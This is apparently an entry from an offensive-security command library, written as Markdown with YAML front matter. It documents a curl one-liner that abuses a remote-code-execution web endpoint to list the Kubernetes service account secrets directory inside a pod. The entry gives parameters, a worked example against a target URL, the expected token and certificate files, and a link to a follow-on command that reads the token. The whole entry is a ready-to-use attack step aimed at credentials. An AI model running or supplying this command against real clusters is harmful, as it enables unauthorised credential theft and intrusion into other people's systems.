---
type: command
executor: bash
data: >-
  curl -s
  "$_RCE_ENDPOINT?cmd=ls%20/var/run/secrets/kubernetes.io/serviceaccount"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - rce
  - kubernetes
  - discovery
verified: true
validated: true
---

# rce-ls-kubernetes-secrets-directory

## Command

```bash
curl -s "$_RCE_ENDPOINT?cmd=ls%20/var/run/secrets/kubernetes.io/serviceaccount"
```

## Description

This command exploits an RCE vulnerability via a web endpoint (e.g., a vulnerable PHP script) to list the contents of the Kubernetes service account secrets directory mounted in a pod. It is used during cloud discovery to identify credentials like tokens and certificates.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_RCE_ENDPOINT | The full URL of the RCE endpoint (e.g., https://target.com/rce.php) | Yes |
| cmd=ls%20... | URL-encoded command to list the directory (/var/run/secrets/kubernetes.io/serviceaccount) | Yes |
| -s | Silent mode to suppress curl progress output | No |

## Examples

### Basic Usage

```bash
curl -s "https://target.example.com/rce.php?cmd=ls%20/var/run/secrets/kubernetes.io/serviceaccount"
```

### With Output Capture

```bash
curl -s "$_RCE_ENDPOINT?cmd=ls%20/var/run/secrets/kubernetes.io/serviceaccount" > secrets_list.txt
```

## Expected Output

A simple directory listing, such as:

```
token
ca.crt
namespace
service-ca.crt
```

This confirms the presence of service account secrets. Errors may indicate restricted permissions or no mount.

## Related

- [[procedures/Enumerate-Kubernetes-Service-Account-Secrets-via-Pod-RCE]]
- [[commands/rce-cat-kubernetes-service-account-token]]
